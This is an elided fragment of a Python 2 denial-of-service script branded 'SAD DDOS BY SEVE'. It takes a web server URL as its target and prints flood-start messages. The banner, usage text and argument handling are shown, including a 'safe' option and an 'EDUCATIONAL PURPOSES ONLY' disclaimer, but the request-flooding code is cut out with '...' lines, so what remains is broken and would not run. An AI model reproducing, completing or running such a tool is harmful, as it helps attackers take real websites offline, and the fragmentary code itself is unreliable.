...
def usage():
	print 'SAD DDOS BY SEVE '
	print 'Usage: saddos.py (url)'
	print 'Example: saddos.py http://example.com'
	print "\a"
print \
"""                                                       
░▄▀▀▒██▀░█▒█▒██▀░
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			print '                                                                    '
 			print 'CREATED BY SEVE SCRIPTS EDUCATIONAL PURPOSES ONLY'
 			print '                                                                    '
			code=500
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Start Ddosing The Webserver"
		print "Created By SEVESCRIPTS"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
